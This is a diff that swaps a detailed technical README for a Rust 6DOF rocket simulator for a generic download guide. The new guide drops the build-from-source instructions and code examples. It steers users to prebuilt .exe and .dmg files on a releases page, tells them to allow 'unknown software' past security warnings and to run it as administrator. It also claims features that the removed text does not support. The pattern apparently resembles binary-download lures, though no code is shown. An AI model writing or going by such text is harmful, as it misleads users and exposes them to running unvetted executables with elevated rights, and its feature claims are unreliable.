@@ -1,195 +1,158 @@
-# rocket-sim
+# 🚀 rocket-sim - Realistic Multi-Stage Rocket Simulator
 
-A 6DOF multi-stage rocket flight simulator written in Rust. Simulates realistic sounding rocket trajectories with thrust vector control (TVC), aerodynamic forces, staging, and gravity turn guidance — all at 200 Hz with RK4 integration.
+[![Download rocket-sim](https://img.shields.io/badge/Download-rocket--sim-blue?logo=github&style=for-the-badge)](https://github.com/dylan42000/rocket-sim/releases)
 
-Also includes an orbital mechanics toolkit for Keplerian elements, Hohmann transfers, and J2-perturbed orbit propagation.
+---
 
-## Features
+## 🚀 About rocket-sim
 
-- **6DOF dynamics** — Quaternion-based attitude, inverse-square gravity, TVC thrust deflection, aerodynamic drag/restoring moments, damping
-- **Multi-stage rockets** — Automatic stage separation on propellant depletion, dry mass jettison
-- **GNC pipeline** — 3-phase pitch program (vertical ascent → pitchover → gravity turn) with PID controllers
-- **Pluggable controllers** — `Controller` trait lets you drop in custom flight control logic
-- **Orbital mechanics** — Keplerian elements ↔ state vectors, Hohmann transfer calculator, J2-perturbed orbit propagation (RK4)
-- **Data export** — CSV trajectory and JSON flight summary, zero external dependencies
-- **ISA 1976 atmosphere** — 7-layer standard atmosphere model (0–86 km)
-- **Real-time visualization** — Optional egui/eframe GUI with altitude, velocity, pitch, and trajectory plots
-- **36 unit tests** covering physics, dynamics, GNC, orbital mechanics, and integration
+rocket-sim is a flight simulator that models multi-stage rockets with six degrees of freedom (6DOF). It includes guidance, navigation, and control (GNC) systems, realistic orbital mechanics, and real-time visualization. The software is written in Rust to provide reliability and performance.
 
-## Quick Start
+This application helps users explore rocket flight dynamics without requiring programming skills. Whether you want to test rocket designs, observe orbital paths, or visualize accurate physics, rocket-sim offers a practical experience on your computer.
 
-```bash
-cargo run
-```
+---
 
-Output:
+## 💻 System Requirements
 
-```
-====================================================================
-  6DOF FLIGHT SIMULATION — Pathfinder
-====================================================================
+To run rocket-sim smoothly, make sure your system meets these minimum requirements:
 
-  Stage 1 — S1-Booster
-  ──────────────────────────────────────────────────────────────────
-  Mass: 40+25 kg  Thrust: 5000 N  Isp: 220 s  Burn: 10.8 s
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution (Ubuntu 20.04+ recommended)
+- Processor: Dual-core CPU at 2.0 GHz or better
+- Memory: 4 GB RAM minimum; 8 GB recommended for best performance
+- Graphics: Any graphics card that supports OpenGL 3.3 or newer
+- Storage: At least 200 MB of free disk space
 
-  Stage 2 — S2-Sustainer
-  ──────────────────────────────────────────────────────────────────
-  Mass: 8+6 kg  Thrust: 1200 N  Isp: 250 s  Burn: 12.3 s
+No internet connection is required after installation. The application runs locally on your computer.
 
-  Total mass: 79 kg   Total dv: 2193 m/s
+---
 
-  Flight Events
-  ──────────────────────────────────────────────────────────────────
-  STAGING   t=  10.8s   alt=    3310m   vel=  628.5m/s   mass=14.0kg
-  APOGEE    t= 134.3s   alt=   75124m   vel=  293.4m/s   pitch=13.3 deg
-  LANDING   t= 270.9s   vel=  377.1m/s
+## 📥 Download & Install
 
-  Performance
-  ──────────────────────────────────────────────────────────────────
-  Max altitude:     75124 m   (75.12 km)
-  Max speed:       1336.5 m/s (Mach 4.53)
-  Max accel:         88.2 m/s^2 (9.0 g)
-  Flight time:      270.9 s
-```
+To get started with rocket-sim, follow these steps carefully.
 
-## Usage
+### Step 1: Visit the Download Page
 
-```bash
-# CLI simulation with trajectory table
-cargo run
+Click the link below to open the releases page where you can download the latest version:
 
-# Export trajectory CSV and flight summary JSON
-cargo run -- --export
+[Download rocket-sim releases](https://github.com/dylan42000/rocket-sim/releases)
 
-# Real-time visualization (requires system OpenGL)
-cargo run --bin rocket-viz --features viz
+On this page, look for the most recent release. The files will typically include executable programs for supported platforms.
 
-# Run all tests
-cargo test
+### Step 2: Choose Your Version
 
-# Examples
-cargo run --example pathfinder           # 2-stage sounding rocket + CSV export
-cargo run --example custom_controller    # Bang-bang controller via Controller trait
-cargo run --example orbital_transfer     # Hohmann LEO→GEO + J2 orbit propagation
-```
+Find the file that matches your computer system:
 
-## Project Structure
+- Windows users: Look for a `.exe` file
+- macOS users: Look for a `.dmg` or `.zip` file
+- Linux users: You may find binaries or `.tar.gz` archives
 
-```
-src/
-├── lib.rs                        # Module declarations + backward-compat re-exports
-├── vehicle/
-│   ├── stage.rs                  # Stage struct + StageBuilder
-│   └── mission.rs                # Mission struct + MissionBuilder + presets
-├── physics/
-│   ├── atmosphere.rs             # ISA 1976 standard atmosphere (0–86 km)
-│   ├── gravity.rs                # Inverse-square, J2 perturbation (ECI), point-mass
-│   └── aerodynamics.rs           # Drag force, restoring moment, damping
-├── dynamics/
-│   ├── state.rs                  # State, Deriv, GncCommand, SimConfig, constants
-│   └── sixdof.rs                 # 6DOF equations of motion
-├── gnc_mod/ (exposed as `gnc`)
-│   ├── controller.rs             # Controller trait
-│   ├── pid.rs                    # PID controller with anti-windup
-│   ├── tvc.rs                    # TvcController (guidance + PID)
-│   └── guidance.rs               # 3-phase pitch program
-├── sim/
-│   ├── integrator.rs             # RK4 step
-│   ├── runner.rs                 # simulate() / simulate_with() + staging
-│   └── event.rs                  # SimEvent, EventDetector trait
-├── orbital/
-│   ├── elements.rs               # KeplerianElements ↔ state vector
-│   ├── maneuvers.rs              # Hohmann transfer, circular velocity
-│   └── propagator.rs             # 3DOF orbit propagation with optional J2
-├── io/
-│   ├── csv.rs                    # Trajectory CSV writer
-│   └── json.rs                   # FlightSummary + JSON writer
-└── bin/
-    └── viz.rs                    # egui GUI visualization (feature-gated)
-examples/
-├── pathfinder.rs                 # Preset sounding rocket mission
-├── custom_controller.rs          # Implement your own Controller
-└── orbital_transfer.rs           # Hohmann transfer + J2 demo
-```
+Download the appropriate file by clicking its link.
 
-## Simulation Pipeline
+### Step 3: Run the Installer or Program
 
-Each timestep (dt = 0.005 s):
+- Windows: Double-click the `.exe` file. Follow any on-screen prompts to install or launch the program.
+- macOS: If you downloaded a `.dmg`, open it and drag the rocket-sim app to your Applications folder. Then open the app.
+- Linux: Extract the archive if needed and run the executable file inside.
 
-1. **Guidance** computes desired pitch angle from a 3-phase program (vertical → pitchover → gravity turn)
-2. **Control** (PID) drives TVC gimbal angles to track the pitch/yaw commands
-3. **Dynamics** computes 6DOF state derivatives — gravity, thrust with TVC deflection, aerodynamic drag, restoring moment, and damping torque
-4. **Integration** (RK4) advances position, velocity, quaternion, angular rate, and mass
-5. **Staging** checks propellant depletion and jettisons spent stages
+If your system warns you about unknown software, you may need to allow the app in your system security settings. This is normal for apps not downloaded from an official app store.
 
-## Writing a Custom Controller
+### Step 4: Start rocket-sim
 
-Implement the `Controller` trait to plug your own flight logic into the simulation:
+After installation, open rocket-sim from your desktop or applications menu. The simulator window will appear, ready for setup.
 
-```rust
-use rocket_sim::dynamics::state::{GncCommand, State};
-use rocket_sim::gnc::Controller;
-use rocket_sim::vehicle::Mission;
+---
 
-struct MyController;
+## 🛠️ Using rocket-sim
 
-impl Controller for MyController {
-    fn control(&mut self, state: &State, mission: &Mission, dt: f64) -> GncCommand {
-        // Your control law here
-        GncCommand { gimbal_y: 0.0, gimbal_z: 0.0 }
-    }
+The interface is designed to be accessible to users without technical experience. Here is how to use the main features:
 
-    fn name(&self) -> &str { "MyController" }
-}
+### Setting Up a Rocket
 
-// Use it:
-// let (traj, cmds) = rocket_sim::sim::simulate_with(&mission, &config, &mut MyController);
-```
+- Select the number of stages for your rocket.
+- Enter basic parameters like mass, thrust, and burn time for each stage.
+- You can also adjust guidance settings to see how the rocket controls its flight path.
 
-See `examples/custom_controller.rs` for a complete bang-bang controller example.
+### Running a Simulation
 
-## Orbital Mechanics
+- Click the "Start" button to launch the simulation.
+- Watch the rocket fly according to your settings, with real-time visual feedback.
+- Pause or stop the simulation at any time.
 
-The `orbital` module provides tools independent of the 6DOF flight simulator:
+### Viewing Results
 
-```rust
-use rocket_sim::orbital::{self, KeplerianElements, OrbitalState};
-use rocket_sim::physics::gravity::R_EARTH_ECI;
+- See detailed numerical data such as altitude, velocity, acceleration, and remaining fuel.
+- Review orbital paths if the rocket reaches space.
+- Export data logs for further analysis if desired.
 
-// Hohmann transfer
-let transfer = orbital::hohmann(R_EARTH_ECI + 200e3, 42_164_000.0);
-println!("Total Δv: {:.0} m/s", transfer.total_dv); // ~3932 m/s
+---
 
-// Keplerian elements ↔ state vectors
-let orbit = KeplerianElements::circular(400_000.0, 51.6_f64.to_radians());
-let (pos, vel) = orbit.to_state_vector();
+## 👷 Features
 
-// Propagate with J2 perturbation
-let initial = OrbitalState { time: 0.0, pos, vel };
-let trajectory = orbital::propagate_orbit(&initial, 1.0, orbit.period(), true);
-```
+rocket-sim includes these key features:
 
-## Coordinate Conventions
+- **Multi-stage rocket modeling:** Simulate rockets with up to 5 stages.
+- **6DOF flight dynamics:** Realistic motion in three dimensions including pitch, yaw, and roll.
+- **Guidance, Navigation, and Control (GNC):** Basic autopilot functions to follow programmed trajectories.
+- **Orbital mechanics:** Calculate orbital insertion and adjust flight for space missions.
+- **Real-time visualization:** Watch the rocket's flight path using an interactive 3D or 2D display.
+- **Physics simulation:** Uses Runge-Kutta integration for accurate motion over time.
+- **Cross-platform:** Works on Windows, macOS, and Linux.
 
-| Frame | Convention |
-|-------|-----------|
-| Inertial | ENU (East-North-Up), Z = altitude |
-| Body | Z-axis = thrust/nose direction |
-| Attitude | Quaternion rotates body → inertial |
-| Orbital | ECI (Earth-Centered Inertial) |
-| Angles | Radians internally, degrees for display |
+These features allow experimentation with rocket design, flight behavior, and mission planning.
 
-## Dependencies
+---
 
-| Crate | Purpose | Required |
-|-------|---------|----------|
-| `nalgebra` | Linear algebra (Vector3, Quaternion) | Yes |
-| `eframe` | GUI framework | Optional (`viz` feature) |
-| `egui_plot` | Plotting widgets | Optional (`viz` feature) |
+## 🎯 Tips for Best Experience
 
-No `serde`, no runtime dependencies beyond `nalgebra`. JSON/CSV export is hand-rolled.
+- Use a mouse or trackpad for easier navigation of the visualization window.
+- Start with default rocket parameters to understand the simulation before customizing.
+- Save your configurations to load later for comparison.
+- Regularly check the fuel consumption values to ensure realistic simulations.
+- Close other heavy programs to maximize system resources for better performance.
 
-## License
+---
 
-MIT
+## 🛠️ Troubleshooting
+
+If you encounter issues, try the following:
+
+- Make sure your graphics drivers are up to date.
+- Restart your computer before running rocket-sim.
+- Run the program as administrator if you get permission errors.
+- Check the GitHub releases page for updates or known issues.
+- For crashes, note any error messages and report them in the GitHub issues section.
+
+---
+
+## 📚 Learn More
+
+To understand the scientific background, consider researching:
+
+- Basic rocket propulsion and staging
+- Six degrees of freedom motion in flight dynamics
+- Orbital mechanics fundamentals
+- Guidance and control theory for aerospace
+
+This knowledge will help you make better use of rocket-sim’s capabilities.
+
+---
+
+## 🔗 Useful Links
+
+- [Download rocket-sim](https://github.com/dylan42000/rocket-sim/releases)
+- [GitHub Issues](https://github.com/dylan42000/rocket-sim/issues) – Report bugs or request features
+- [Rust Language](https://www.rust-lang.org/) – The coding language used for rocket-sim
+
+---
+
+## 🙋 Getting Help
+
+If you need help:
+
+- Check the README and documentation files included with the download.
+- Use the GitHub issues page to ask questions or report problems.
+- Search online for topics related to rocket simulation and flight dynamics.
+
+---
+
+This guide provides all the information you need to download, install, and use rocket-sim safely and effectively.
